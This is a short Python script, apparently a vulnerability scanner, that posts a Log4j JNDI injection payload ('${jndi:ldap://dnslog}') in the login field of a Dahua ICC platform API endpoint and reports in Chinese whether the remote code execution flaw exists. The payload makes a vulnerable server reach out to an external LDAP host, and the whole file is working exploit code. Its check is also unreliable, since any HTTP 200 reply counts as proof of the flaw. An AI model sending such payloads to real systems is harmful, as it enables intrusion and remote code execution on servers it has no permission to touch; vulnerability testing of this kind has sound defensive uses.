import requests

def check_dahua_icc_log4j_rce(url):
    try:
        headers = {
            "Content-Type": "application/json;charset=utf-8"
        }
        data = """
        {
            "loginName":"${jndi:ldap://dnslog}"
        }
        """
        response = requests.post(f"{url}/evo-apigw/evo-brm/1.2.0/user/is-exist", headers=headers, data=data)
        if response.status_code == 200:
            return "大华ICC智能物联综合管理平台 log4j远程代码执行漏洞存在"
        else:
            return "大华ICC智能物联综合管理平台 log4j远程代码执行漏洞不存在"
    except Exception as e:
        return f"Error: {e}"
